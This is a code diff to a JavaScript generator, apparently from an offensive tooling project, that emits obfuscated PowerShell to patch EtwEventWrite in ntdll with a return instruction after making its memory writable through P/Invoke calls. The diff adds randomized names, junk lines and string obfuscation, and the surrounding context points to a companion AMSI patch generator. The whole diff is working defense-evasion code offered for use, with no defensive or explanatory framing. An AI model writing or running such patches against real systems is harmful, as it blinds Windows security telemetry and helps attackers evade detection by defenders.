@@ -134,29 +134,44 @@ export function generatePowerShellAmsiPatch() {
 
 export function generatePowerShellEtwPatch() {
   const v = {
-    mod: randomVarName('short'),
+    sig: randomVarName('short'),
+    kType: randomVarName('short'),
+    lib: randomVarName('short'),
     addr: randomVarName('short'),
     patch: randomVarName('short'),
+    oldProt: randomVarName('short'),
     ntdll: randomVarName('short'),
     funcName: randomVarName('short'),
+    ns: randomFuncName(),
+    cn: randomFuncName(),
   }
 
-  const ntdllStr = obfuscateStringPS('ntdll')
+  const ntdllStr = obfuscateStringPS('ntdll.dll')
   const etwFuncStr = obfuscateStringPS('EtwEventWrite')
-  const getProc = obfuscateStringPS('GetProcAddress')
-  const getModHandle = obfuscateStringPS('GetModuleHandle')
+  const dllImport = obfuscateStringPS('kernel32.dll')
 
+  // Build P/Invoke signature with obfuscated DllImport string
   const lines = [
-    `# ETW blind`,
+    `# ETW blind (P/Invoke)`,
+    psJunk(),
+    `$${v.sig} = @"`,
+    `[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);`,
+    `[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);`,
+    `[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);`,
+    `"@`,
+    `$${v.kType} = Add-Type -MemberDefinition $${v.sig} -Name '${v.cn}' -Namespace '${v.ns}' -PassThru`,
     psJunk(),
     `$${v.ntdll} = ${ntdllStr}`,
     `$${v.funcName} = ${etwFuncStr}`,
+    `$${v.lib} = $${v.kType}::LoadLibrary($${v.ntdll})`,
+    `$${v.addr} = $${v.kType}::GetProcAddress($${v.lib}, $${v.funcName})`,
     psJunk(),
-    `$${v.mod} = [System.Runtime.InteropServices.Marshal]::GetHINSTANCE([Reflection.Assembly]::LoadWithPartialName($${v.ntdll}).GetModules()[0])`,
-    `$${v.addr} = [Win.Kernel32]::GetProcAddress($${v.mod}, $${v.funcName})`,
+    `$${v.oldProt} = 0`,
+    `$${v.kType}::VirtualProtect($${v.addr}, [UIntPtr]::new(1), 0x40, [ref]$${v.oldProt}) | Out-Null`,
     `$${v.patch} = [byte[]](0xC3)`,
-    psJunk(),
     `[System.Runtime.InteropServices.Marshal]::Copy($${v.patch}, 0, $${v.addr}, $${v.patch}.Length)`,
+    `$${v.kType}::VirtualProtect($${v.addr}, [UIntPtr]::new(1), $${v.oldProt}, [ref]$${v.oldProt}) | Out-Null`,
+    psJunk(),
   ]
 
   return lines.join('\n')
